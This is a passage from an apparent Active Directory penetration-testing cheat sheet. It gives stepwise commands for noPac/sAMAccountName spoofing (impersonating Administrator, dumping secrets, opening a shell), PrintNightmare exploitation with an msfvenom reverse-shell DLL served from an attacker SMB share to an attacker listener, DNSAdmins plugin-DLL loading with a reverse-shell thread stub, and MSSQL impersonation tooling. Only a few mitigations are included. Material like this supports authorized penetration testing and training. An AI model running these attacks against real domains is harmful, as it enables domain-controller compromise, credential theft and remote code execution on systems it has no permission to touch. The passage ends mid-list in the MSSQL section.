<span class="nb">Set-ADComputer</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">machine</span><span class="p">&gt;</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="nv">$Null</span> 
<span class="nb">Remove-ADComputer</span> <span class="n">-Identity</span> <span class="s1">'&lt;controlled machine DN&gt;'</span>
</code></pre></div>
<p>Cleanup with Impacket's <code>rbcd</code> and <code>addcomputer</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-rbcd<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">'&lt;controlled machine account&gt;$'</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'&lt;target machine account&gt;$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">'flush'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>

impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'&lt;name&gt;$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-dc-host<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;'</span><span class="w"> </span>-delete
</code></pre></div>
<h4 id="mitigations_7">Mitigations</h4>
<ul>
<li>Limit Domain Admin and Administrator logins to non DC servers or to specific servers.</li>
<li>Set the <code>Account is sensitive and cannot be delegated</code> attribute for privileged accounts.</li>
</ul>
<h3 id="samaccountname-nopac_1">sAMAccountName (nopac)</h3>
<p>This attack is possible when the following CVEs are present:</p>
<ul>
<li><strong>CVE-2021-42278 - Name impersonation</strong>: No validation process exists for computer accounts name to have a trailing <code>$</code>.</li>
<li><strong>CVE-2021-42287 - KDC bamboozling</strong>: When requesting a service ticket with a TGT, the KDC will search for the user's <code>sAMAccountName</code> requesting the ticket. If this is not found, a <code>$</code> is appended to the username and searched again. </li>
</ul>
<div class="highlight"><pre><span></span><code>#<span class="w"> </span><span class="nv">https</span>:<span class="o">//</span><span class="nv">www</span>.<span class="nv">thehacker</span>.<span class="nv">recipes</span><span class="o">/</span><span class="nv">ad</span><span class="o">/</span><span class="nv">movement</span><span class="o">/</span><span class="nv">kerberos</span><span class="o">/</span><span class="nv">samaccountname</span><span class="o">-</span><span class="nv">spoofing</span>
<span class="nv">What</span><span class="w"> </span><span class="nv">happens</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">that</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">TGT</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">obtained</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">bob</span>,<span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">bob</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="nv">gets</span><span class="w"> </span><span class="nv">removed</span>,<span class="w"> </span><span class="nv">using</span><span class="w"> </span><span class="nv">that</span><span class="w"> </span><span class="nv">TGT</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">request</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">ticket</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">another</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">himself</span><span class="w"> </span><span class="ss">(</span><span class="nv">S4U2self</span><span class="ss">)</span><span class="w"> </span><span class="nv">will</span><span class="w"> </span><span class="nb">result</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">KDC</span><span class="w"> </span><span class="nv">looking</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">bob</span>$<span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">AD</span>.<span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">domain</span><span class="w"> </span><span class="nv">controller</span><span class="w"> </span><span class="nv">account</span><span class="w"> </span><span class="nv">bob</span>$<span class="w"> </span><span class="nv">exists</span>,<span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nv">bob</span><span class="w"> </span><span class="ss">(</span><span class="nv">the</span><span class="w"> </span><span class="nv">user</span><span class="ss">)</span><span class="w"> </span><span class="nv">just</span><span class="w"> </span><span class="nv">obtained</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">ticket</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">bob</span>$<span class="w"> </span><span class="ss">(</span><span class="nv">the</span><span class="w"> </span><span class="nv">domain</span><span class="w"> </span><span class="nv">controller</span><span class="w"> </span><span class="nv">account</span><span class="ss">)</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">any</span><span class="w"> </span><span class="nv">other</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span>🤯.
</code></pre></div>
<p>This attack can be conducted in two ways:</p>
<ul>
<li>Abusing a Machine Account</li>
<li>Abusing a User Account</li>
</ul>
<h4 id="samaaccountname-spoofing-abusing-a-machine-account">sAMAaccountName Spoofing - Abusing a Machine Account</h4>
<p>The attack is the following:</p>
<ol>
<li>Create a machine account (taking in account the machine quota of the DC).</li>
<li>Since the creator of a machine account has full control on it, remove any SPN that refers it actual name from the <code>servicePrincipalName</code> field.</li>
<li>Change the machine account name to that of a Domain Controller without the trailing <code>$</code> (CVE-2021-42278).</li>
<li>Request a TGT.</li>
<li>Restore the original account name.</li>
<li>Request a TGS on behalf of a domain admin using the previously obtained TGT with S4U2self. The KDC will perform S4U2self as if the requesting user is the domain controller account.</li>
<li>Use the TGS.</li>
</ol>
<h4 id="samaaccountname-spoofing-abusing-a-user-account">sAMAaccountName Spoofing - Abusing a User Account</h4>
<p>The attack is the same as for Machine Account but at least a <code>WriteProperty</code> permission is required on the controlled user's <code>sAMAaccountName</code> in order to edit its value. Moreover, the user account password or hash is necessary to obtain the TGT.</p>
<p>Check if DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 and its machine quota:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;username&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-M<span class="w"> </span>nopac
nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;username&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-M<span class="w"> </span>maq
</code></pre></div>
<p>Add computer to the DC with Impacket's <code>addcomputer</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'&lt;new computer name&gt;$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-dc-host<span class="w"> </span>&lt;DC<span class="w"> </span>hostname&gt;<span class="w"> </span>-domain-netbios<span class="w"> </span>&lt;DC<span class="w"> </span>netbios&gt;<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;'</span>
</code></pre></div>
<p>Cleanup computer object's SPNs (shouldn't be necessary when creating the computer with impacket's <code>addcomputer</code>) with <a href="https://github.com/dirkjanm/krbrelayx">addspn</a>:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>addspn.py<span class="w"> </span>--clear<span class="w"> </span>-t<span class="w"> </span><span class="s1">'&lt;new computer name&gt;$'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;domain&gt;\&lt;username&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="s1">'&lt;DC IP/hostname&gt;'</span>
</code></pre></div>
<p>Rename the machine using <a href="https://github.com/fortra/impacket/blob/b4fbcf9196e9b6098edae0ae7794005d2e138ccd/examples/renameMachine.py">renameMachine.py</a>:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>renameMachine.py<span class="w"> </span>-current-name<span class="w"> </span><span class="s1">'&lt;new computer name&gt;$'</span><span class="w"> </span>-new-name<span class="w"> </span><span class="s1">'&lt;target DC name without $&gt;'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;DC ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span><span class="w"> </span>
</code></pre></div>
<p>Request TGT for the renamed machine with Impacket's <code>getTGT</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-getTGT<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;DC ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;renamed computer name&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
</code></pre></div>
<p>Restore the new machine name using <code>renameMachine</code> or delete it with Impacket's <code>addcomputer</code>.</p>
<p>Use received TGT to request a TGS to the KDC:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;target<span class="w"> </span>DC<span class="w"> </span>name<span class="w"> </span>without<span class="w"> </span>$&gt;.ccache
impacket-getST<span class="w"> </span>-self<span class="w"> </span>-impersonate<span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span>-altservice<span class="w"> </span><span class="s1">'cifs/&lt;domain FQDN&gt;'</span><span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;DC ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;target DC name without $&gt;'</span>
</code></pre></div>
<p>Use then the received TGS to authenticate as Domain Administrator.</p>
<p>Perform the whole attack automatically with <a href="">noPac</a>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Request TGS</span>
python3<span class="w"> </span>noPac.py<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>--impersonate<span class="w"> </span>Administrator

<span class="c1"># Dump Secrets</span>
python3<span class="w"> </span>noPac.py<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>--impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dump

<span class="c1"># Open shell</span>
python3<span class="w"> </span>noPac.py<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>--impersonate<span class="w"> </span>Administrator<span class="w"> </span>-shell
</code></pre></div>
<p><strong>Note</strong>: remember to delete created machine account with administrative privileges if used user has not enough permissions.</p>
<h3 id="printnightmare-cve-2021-34527_1">PrintNightmare (CVE-2021-34527)</h3>
<p>This vulnerability allows to achieve <strong>RCE</strong> when remote connection is allowed or at least <strong>local privilege escalation</strong> otherwise.</p>
<p>Vulnerable functions are functions <code>RpcAddPrinterDriverEx</code> and <code>RpcAddPrinterDriver</code> that allow remote driver installation by users.</p>
<p>The attack (from <a href="https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare">TheHackerRecipes</a>):</p>
<ol>
<li>A mischievious driver (a DLL file) is hosted on a SMB share.</li>
<li>The client creates a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2"><code>DRIVER_INFO_2</code></a> object containing the path to the attacker's DLL and passes it into the DRIVER_CONTAINER object.</li>
<li>The client calls <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b"><code>RpcAddPrinterDriverEx</code></a> with the <code>DRIVER_CONTAINER</code> to load the attacker's DLL into the server's dynamic library and with multiple bit values within the <code>dwFileCopyFlags</code> in order to bypass the <code>SeLoadDriverPrivilege</code> privilege verification by the server.</li>
<li>The attacker's DLL is executed on the server within <code>SYSTEM</code> context.</li>
</ol>
<p>Check if RPC pipes are enabled with Impacket's <code>rpcdump</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-rpcdump<span class="w"> </span>@&lt;target&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-e<span class="w"> </span><span class="s1">'MS-RPRN|MS-PAR'</span>
</code></pre></div>
<p>Check if target is vulnerable with <a href="https://github.com/ly4k/PrintNightmare">PrintNightmare</a>:</p>
<div class="highlight"><pre><span></span><code>printnightmare.py<span class="w"> </span>-check<span class="w"> </span><span class="s1">'&lt;user&gt;:&lt;password&gt;@&lt;target&gt;'</span>
</code></pre></div>
<p>Check if target is vulnerable with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>printnightmare
</code></pre></div>
<p>Generate a reverse shell DLL with <code>msfvenom</code> (easily blocked by AV - better use a custom payload - see <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#dlls">Misc - DLLs</a>):</p>
<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>ip&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>path&gt;
</code></pre></div>
<p>Start a SMB server with Impacket's <code>smbserver</code>:</p>
<div class="highlight"><pre><span></span><code>smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span><span class="s2">"&lt;share name&gt;"</span><span class="w"> </span>&lt;share<span class="w"> </span>path&gt;
</code></pre></div>
<p>Start the reverse shell listener:</p>
<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span>&lt;listening<span class="w"> </span>port&gt;
</code></pre></div>
<p>Run <code>PrintNightmare</code> exploit:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Remote DLL</span>
printnightmare.py<span class="w"> </span>-dll<span class="w"> </span><span class="s1">'\\&lt;attacker smb server&gt;\&lt;share name&gt;\&lt;dll name&gt;'</span><span class="w"> </span><span class="s1">'&lt;user&gt;:&lt;password&gt;@&lt;target&gt;'</span><span class="w"> </span><span class="o">[</span>-name<span class="w"> </span><span class="s1">'&lt;Custom driver name&gt;'</span><span class="o">]</span>

<span class="c1"># Local DLL</span>
printnightmare.py<span class="w"> </span>-dll<span class="w"> </span><span class="s1">'&lt;dll path&gt;'</span><span class="w"> </span><span class="s1">'&lt;user&gt;:&lt;password&gt;@&lt;target&gt;'</span><span class="w"> </span><span class="o">[</span>-name<span class="w"> </span><span class="s1">'&lt;Custom driver name&gt;'</span><span class="o">]</span>
</code></pre></div>
<p>List current printer drivers with <code>PrintNightmare</code>:</p>
<div class="highlight"><pre><span></span><code>printnightmare.py<span class="w"> </span>-list<span class="w"> </span><span class="s1">'&lt;user&gt;:&lt;password&gt;@&lt;target&gt;'</span>
</code></pre></div>
<p>Delete printer driver with <code>PrintNightmare</code>:</p>
<div class="highlight"><pre><span></span><code>printnightmare.py<span class="w"> </span>-delete<span class="w"> </span>-name<span class="w"> </span><span class="s1">'&lt;driver name&gt;'</span><span class="w"> </span><span class="s1">'&lt;user&gt;:&lt;password&gt;@&lt;target&gt;'</span>
</code></pre></div>
<p>Take also a look to:</p>
<ul>
<li><a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare">SharpPrintNightmare</a></li>
</ul>
<h3 id="dnsadmins">DNSAdmins</h3>
<p>Users member of the DNSAdmins group are allowed to load arbitrary DLL plugins for the DNS server. This DLL gets loaded by the <code>dns.exe</code> process; this process is the DNS server service (generally running on a DC) and runs with <strong>SYSTEM</strong> level privileges.</p>
<ul>
<li>The loaded DLL will run with the same level of privileges!</li>
<li>The value for <code>ServerLevelPluginDll</code> at registry <code>HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters</code> will contain the path to the DLL.</li>
</ul>
<p>By performing a DLL injection attack, it could be possible to escalate privileges to Domain Admin when the DC serves as DNS.</p>
<p>Note: in order to restart the DNS service, the DNSAdmins group must have the privileges to restart the DNS service; by default, this group <strong>CANNOT</strong> restart DNS service.</p>
<p>References:</p>
<ul>
<li><a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</a></li>
</ul>
<p>Enumerate the members of the DNSAdmins group:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetGroupMember</span> <span class="n">-GroupName</span> <span class="s2">"DNSAdmins"</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADGroupMember</span> <span class="n">-Identity</span> <span class="n">DNSAdmins</span>
</code></pre></div>
<p>Load the DLL to the target DNS service - <strong>requires RSAT with DNS Server Tools installed</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="n">dnscmd</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">server</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="p">\\&lt;</span><span class="n">attacker</span> <span class="n">controlled</span> <span class="n">smb</span> <span class="n">share</span><span class="p">&gt;\&lt;</span><span class="n">path</span> <span class="n">to</span> <span class="n">dll</span><span class="p">&gt;</span>

<span class="c"># Or, alternatively</span>
<span class="nv">$dnsettings</span> <span class="p">=</span> <span class="nb">Get-DnsServerSetting</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">server</span><span class="p">&gt;</span> <span class="n">-Verbose</span> <span class="n">-All</span>
<span class="nv">$dnsettings</span><span class="p">.</span><span class="n">ServerLevelPluginDll</span> <span class="p">=</span> <span class="s2">"\\&lt;attacker controlled smb share&gt;\&lt;path to dll&gt;"</span>
<span class="nb">Set-DnsServerSetting</span> <span class="n">-InputObject</span> <span class="nv">$dnsettings</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">server</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Note: <code>&lt;target server&gt;</code> generally is the DC.</p>
<p>Stop and restart the DNS service (compromised user must have enough privileges):</p>
<div class="highlight"><pre><span></span><code>sc<span class="w"> </span><span class="se">\\</span>&lt;target<span class="w"> </span>server&gt;<span class="w"> </span>stop<span class="w"> </span>dns
sc<span class="w"> </span><span class="se">\\</span>&lt;target<span class="w"> </span>server&gt;<span class="w"> </span>start<span class="w"> </span>dns
</code></pre></div>
<p>Here can be found a template for the DLL: <a href="https://github.com/dim0x69/dns-exe-persistance">dns-exe-persistence</a>.</p>
<ul>
<li>Edit the function <code>DnsPluginInitialize</code> in the file <code>Win32Project1.cpp</code></li>
<li>In order to not crash the DNS server, <strong>run any reverse shell in a separate thread</strong>!</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">DNS_PLUGIN_API</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">DnsPluginInitialize</span><span class="p">(</span><span class="n">PVOID</span><span class="w"> </span><span class="n">a1</span><span class="p">,</span><span class="w"> </span><span class="n">PVOID</span><span class="w"> </span><span class="n">a2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">h</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">threadId</span><span class="p">;</span>
<span class="w">    </span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">RevShellFunction</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">threadId</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="mssql-server">MSSQL Server</h3>
<p>In Microsoft SQL server it's important to distinguish a <strong>login</strong> from a <strong>user</strong>:</p>
<ul>
<li>A <strong>login</strong> is at the <strong>server level</strong> and is used to authenticate a user to SQL Server. It verifies who the user is (<strong>Authentication</strong>). It exists at the <strong>SQL Server instance level</strong>.</li>
<li>A <strong>user</strong> is at the <strong>database level</strong> and is associated with a login. It defines what a user can do inside a specific database <strong>(Authorization)</strong>. Exists within a <strong>particular database</strong>.</li>
</ul>
<p>In Microsoft SQL Server, <strong>impersonation</strong> is a security feature that allows one user or process to <strong>execute statements as if they were another user</strong>.</p>
<ul>
<li>This is typically done using the <code>EXECUTE AS</code> statement, when impersonation is active.</li>
</ul>
<p>Impersonation can happen in two different contexts:</p>
<ul>
<li><strong>EXECUTE AS USER</strong>: Impersonates a <strong>database user</strong>.</li>
<li><strong>EXECUTE AS LOGIN</strong>: Impersonates a <strong>server-level login</strong>.</li>
</ul>
<p>An attacker could abuse misconfigurations on impersonation permissions to escalate privileges on the DB and potentially achieving command execution.</p>
<ul>
<li>The impact of this security issue is aggravated if its also possible to abuse <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#mssql-database-links">MSSQL Database Links</a>, moving laterally to other domains.</li>
</ul>
<p>Connect to a SQL server with Impacket's <code>mssqlclient</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target<span class="w"> </span>host&gt;<span class="w"> </span>-windows-auth
</code></pre></div>
<p><code>mssqlclient</code> commands:</p>
<div class="highlight"><pre><span></span><code><span class="n">lcd</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">changes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">exit</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">terminates</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="p">(</span><span class="ow">and</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">session</span><span class="p">)</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enable_xp_cmdshell</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">means</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">disable_xp_cmdshell</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">means</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enum_db</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">databases</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enum_links</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">linked</span><span class="w"> </span><span class="n">servers</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enum_impersonate</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enum_logins</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">users</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enum_users</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">users</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">enum_owner</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">owner</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">exec_as_user</span><span class="w"> </span><span class="p">{</span><span class="n">user</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">impersonate</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">user</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">exec_as_login</span><span class="w"> </span><span class="p">{</span><span class="n">login</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">impersonate</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="p">{</span><span class="n">cmd</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">executes</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w">  </span>
<span class="w">&nbsp;&nbsp;&nbsp;</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="p">{</span><span class="n">path</span><span class="p">}</span><span class="w"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="o">-</span><span class="w"> </span><span class="n">executes</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">path</span><span class="w">  </span>
